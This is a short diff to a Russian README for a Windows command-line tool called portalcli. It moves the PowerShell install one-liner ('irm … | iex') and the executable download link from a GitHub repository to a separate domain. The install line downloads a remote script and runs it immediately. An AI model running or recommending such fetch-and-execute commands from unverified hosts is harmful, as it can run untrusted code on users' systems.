@@ -5,7 +5,7 @@
 ## Установка
 
 ```powershell
-irm https://raw.githubusercontent.com/Nexus-god/portal-cli/main/install.ps1 | iex
+irm https://portalmodel.xyz/install.ps1 | iex
 ```
 
 ## Использование
@@ -17,6 +17,6 @@ portalcli help
 
 ## Ручная установка
 
-1. Скачать [portalcli.exe](https://github.com/Nexus-god/portal-cli/releases/latest/download/portalcli.exe)
+1. Скачать [portalcli.exe](https://portalmodel.xyz/portalcli.exe)
 2. Положить в `%LOCALAPPDATA%\portalcli\`
 3. Добавить в PATH
